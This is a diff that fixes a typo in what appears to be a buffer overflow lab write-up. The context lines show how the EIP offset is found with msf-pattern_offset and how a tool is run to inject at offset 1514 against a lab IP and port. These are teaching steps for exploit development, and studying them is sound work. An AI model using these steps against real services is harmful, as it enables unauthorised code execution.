@@ -28,7 +28,8 @@ and supply it to **msf-pattern_create**
 msf-pattern_offset -l 1600 -q "35794234"
 ```
 ![Get Offset](img/get-offset-from-cyclic-chars.png)
-Now that we have found the correct offset, we can supply it to Badboy, to check if EIP will holde the value "CCCC" or "43434343"
+
+Now that we have found the correct offset, we can supply it to Badboy, to check if EIP will hold the value "CCCC" or "43434343"
 ```
 python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" -off 1514
 ```
